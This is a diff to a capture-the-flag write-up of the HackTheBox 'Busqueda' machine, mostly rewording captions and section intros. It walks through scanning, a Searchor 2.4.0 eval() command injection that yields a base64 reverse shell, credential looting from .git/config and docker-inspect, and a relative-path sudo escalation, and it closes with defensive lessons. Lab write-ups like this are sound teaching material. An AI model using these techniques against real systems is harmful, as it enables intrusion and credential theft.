@@ -18,13 +18,13 @@ import Principle from '@components/Principle.astro';
 
 ## Recon
 
-> Goal: Identify exposed services and attack surface.
+> Every box opens with the same two questions: what is listening, and what is it running?
 
-A box starts with one question: what is listening, and what is it running. First, confirm the host is up.
+First, confirm the host is actually up.
 
 <Toggle label="Host reachability <code>ping</code>">
 
-```bash frame="code" title="Bash"
+```bash frame="code" title="Bash" {4}
 ┌──(Idan@Kali)-[~/Busqueda]
 └─> ping 10.129.228.217
 PING 10.129.228.217 (10.129.228.217) 56(84) bytes of data.
@@ -43,7 +43,7 @@ The `ttl=63` is a small tell (a Linux default of 64, minus one hop). The scan se
 
 <Toggle label="Service & version enumeration <code>nmap</code>">
 
-```bash frame="code" title="Bash"
+```bash frame="code" title="Bash" {13}
 ┌──(Idan@Kali)-[~/Busqueda]
 └─> nmap -sC -sV 10.129.228.217
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-12 20:37 -0400
@@ -100,9 +100,9 @@ The redirect to a `.htb` hostname is the signal: the server wants a `Host` heade
 
 ## Web Enumeration
 
-> Goal: Identify virtual hosts and domain-related misconfigurations.
+> Apache is redirecting me to a name it never introduced. Time to make searcher.htb answer, then find out what is really running behind it.
 
-Now make the site reachable by name, then fingerprint what runs behind Apache. First, map the hostname in `/etc/hosts`:
+First, map the hostname in `/etc/hosts`:
 
 ```bash frame="code" title="Bash"
 ┌──(Idan@Kali)-[~/Busqueda]
@@ -113,14 +113,14 @@ Now make the site reachable by name, then fingerprint what runs behind Apache. F
 
 With the name resolving, `searcher.htb` loads: a clean search front end that proxies queries to other engines.
 
-![Searcher.htb landing page, a minimal search front end](../../../../assets/hackthebox/easy/busqueda/busqueda-1.png)
+![Searcher web application: a single search field above a row of engine buttons](../../../../assets/hackthebox/easy/busqueda/busqueda-1.png)
 *The application: a search box that forwards your query to a chosen engine. Worth asking how it builds that redirect.*
 
 I fingerprinted the stack three ways: `feroxbuster` for hidden routes, `nikto` for misconfigurations, and `whatweb` for the technology behind the polish.
 
 <Toggle label="Directory and route discovery <code>feroxbuster</code>">
 
-```bash frame="code" title="Bash"
+```bash frame="code" title="Bash" {3}
 ┌──(Idan@Kali)-[~/Busqueda]
 └─> feroxbuster --url http://searcher.htb/ -q -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --insecure -C 404 -o feroxscan
 405      GET        5l       20w      153c http://searcher.htb/search
@@ -134,7 +134,7 @@ The attack surface is surprisingly small. The only route worth a closer look is 
 
 <Toggle label="Header and version sweep <code>nikto</code>">
 
-```bash frame="code" title="Bash"
+```bash frame="code" title="Bash" {8}
 ┌──(Idan@Kali)-[~/Busqueda]
 └─> nikto -h http://searcher.htb -Tuning 2 -maxtime 300
 - Nikto v2.6.0
@@ -176,14 +176,14 @@ And there it is: the facade drops, confirming a custom Python backend is handlin
 
 ## Foothold: Searchor Command Injection
 
-> Goal: Abuse the Searchor vulnerability to land a shell.
+> Searchor 2.4.0 builds its redirect from whatever I type. If it evaluates that string, the search box is a shell.
 
 A `405 Method Not Allowed` is a hint, not a wall: the route exists, it just expects a different HTTP method. So I sent `/search` a `POST` through Burp Suite to see how it handles input.
 
-![BurpSuite request to /search showing the engine and query parameters](../../../../assets/hackthebox/easy/busqueda/busqueda-2.png)
+![Burp Suite showing a POST to /search with engine and query fields in the request body](../../../../assets/hackthebox/easy/busqueda/busqueda-2.png)
 *This confirms the application is directly processing user-controlled input before performing the search logic.*
 
-![Looking again at the landing page footer, the backend engine is revealed as Searchor 2.4.0.](../../../../assets/hackthebox/easy/busqueda/busqueda-3.png)
+![Application footer text reading Searchor 2.4.0](../../../../assets/hackthebox/easy/busqueda/busqueda-3.png)
 *The footer then confirms the backend engine as Searchor 2.4.0.*
 
 That version number is the lead. Searchor 2.4.0 has a well-documented arbitrary command injection.
@@ -201,7 +201,7 @@ Searchor builds its result by calling Python's `eval()` on a string assembled fr
 The public script automates the payload chain: a bash reverse shell is base64-encoded, wrapped inside the `os.system` break-out, then URL-encoded (notably the `+` characters) to survive transit, before being posted to `/search`.
 <Toggle label="Reproducing the attack <code>exploit.sh</code>">
 
-```bash frame="code" title="Bash"
+```bash frame="code" title="Bash" {7}
 ### Exploit Code (exploit.sh):
 
 #!/bin/bash -
@@ -241,9 +241,19 @@ svc
 
 *The script closes Searchor's `eval()` expression, runs a base64 reverse shell, and the listener catches `svc`.*
 
-![Reverse shell landing as the svc user](../../../../assets/hackthebox/easy/busqueda/busqueda-4.png)
+![Terminal listener showing an interactive shell prompt as user svc on busqueda](../../../../assets/hackthebox/easy/busqueda/busqueda-4.png)
+*The listener catches the shell: I am svc, standing inside the application's own directory.*
 
 I land as `svc` in `/var/www/app`, the application's own directory. That is the foothold, and the user flag is one `cat` away.
+
+<Toggle label="Reading the user flag <code>cat</code>">
+
+```bash frame="code" title="Bash"
+svc@busqueda:/var/www/app$ cat user.txt
+<user flag>
+```
+
+</Toggle>
 
 ### <span class="task-title">User Flag</span>
 
@@ -253,9 +263,9 @@ I land as `svc` in `/var/www/app`, the application's own directory. That is the 
 
 ## Privilege Escalation
 
-> Goal: Exploit misconfigurations to gain higher-level access to the system.
+> svc got me through the door. Something here is trusted more than it should be, and I need to find it, starting with whatever the web root left behind.
 
-Two questions drive the climb to root: what secrets are lying around this directory, and what is `svc` allowed to do that it should not be.
+The reflex is `sudo -l`, but it wants svc's password and I do not have one yet. So the order inverts: before I can ask what svc may run as root, I need a credential, and a web app's own directory is the first place to dig.
 
 ### Loot the Checked-in .git Directory
 
@@ -263,7 +273,7 @@ A `.git` folder inside the web root is a gift: its config may hold the remote's 
 
 <Toggle label="Exposed <code>.git/config</code> and remote credentials">
 
-```bash frame="code" title="Bash"
+```bash frame="code" title="Bash" {8}
 svc@busqueda:/var/www/app/.git$ cat config
 [core]
  repositoryformatversion = 0
@@ -288,9 +298,9 @@ The remote points at a new host `gitea.searcher.htb`, so I add it to `/etc/hosts
 ```
 
 ![Gitea login screen for gitea.searcher.htb](../../../../assets/hackthebox/easy/busqueda/busqueda-5.png)
-*The new virtual host resolves correctly, revealing a Gitea login screen for gitea.searcher.htb.*
+*The new virtual host resolves, and the Gitea instance loads.*
 
-![The Searcher_site repository inside Gitea](../../../../assets/hackthebox/easy/busqueda/busqueda-6.png)
+![Gitea repository page listing the Searcher_site project files](../../../../assets/hackthebox/easy/busqueda/busqueda-6.png)
 *Inside Gitea, I find the Searcher_site repository.*
 
 <Callout type="loot">
@@ -305,7 +315,7 @@ With the password in hand, `sudo -l` is the fast path.
 
 <Toggle label="Where can svc act as root? <code>sudo</code>">
 
-```bash frame="code" title="Bash"
+```bash frame="code" title="Bash" {7}
 svc@busqueda:/var/www/app/.git$ sudo -l
 [sudo] password for svc:
 Matching Defaults entries for svc on busqueda:
@@ -340,7 +350,7 @@ f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 years ago   Up 
 `docker-inspect` takes a format string and a container name, letting me read a container’s full configuration, including environment variables. I pull Gitea’s config and pipe it through `jq` for readability.
 <Toggle label="Container environment <code>docker-inspect gitea</code>">
 
-```bash frame="code" title="Bash"
+```bash frame="code" title="Bash" {11}
 svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' gitea
 # piped the JSON back on Kali through jq:
 {
@@ -366,7 +376,8 @@ svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-insp
 
 *Inspecting the Gitea container leaks its database password straight out of the environment variables.*
 
-![Logging into Gitea as administrator with the recovered database password](../../../../assets/hackthebox/easy/busqueda/busqueda-7.png)
+![Gitea dashboard signed in as the administrator account](../../../../assets/hackthebox/easy/busqueda/busqueda-7.png)
+*The database password doubles as the administrator's: one reused secret opens the private scripts repository.*
 
 <Callout type="loot">
 
@@ -379,7 +390,7 @@ svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-insp
 
 The `administrator` scripts repo in Gitea exposes the source of `system-checkup.py`. The `full-checkup` action is the weak point: it calls a helper script using a relative path.
 
-```python frame="code" title="Python"
+```python frame="code" title="Python" {3}
 elif action == 'full-checkup':
     try:
         arg_list = ['./full-checkup.sh']
@@ -444,7 +455,7 @@ The whole path in one breath: Searchor 2.4.0 evaluates whatever I type into the 
 
 Three lessons, one per stage of the chain:
 
-1. **`eval()` on user input is the original sin.** Searchor's command injection existed because it evaluated a string built from the query. A blocklist would not have saved it, the fix is to never let untrusted text reach an evaluator. Parameterize, do not sanitize.
+1. **`eval()` on user input is the original sin.** Searchor's command injection existed because it evaluated a string built from the query. A blocklist would not have saved it, the fix is to never let untrusted text reach an evaluator.
 2. **Credential reuse turns a single leak into a cascade.** The password found in `.git/config` also worked for `svc` over SSH, and the Gitea database password also worked for `administrator`. A single secret that travels between accounts collapses every boundary it touches.
 3. **A relative path under sudo is a straightforward privilege escalation.** `system-checkup.py` called `./full-checkup.sh` instead of an absolute path, and `secure_path` does not cover paths a script constructs for itself. Privileged programs should call helpers by absolute path and pin their working directory.
 
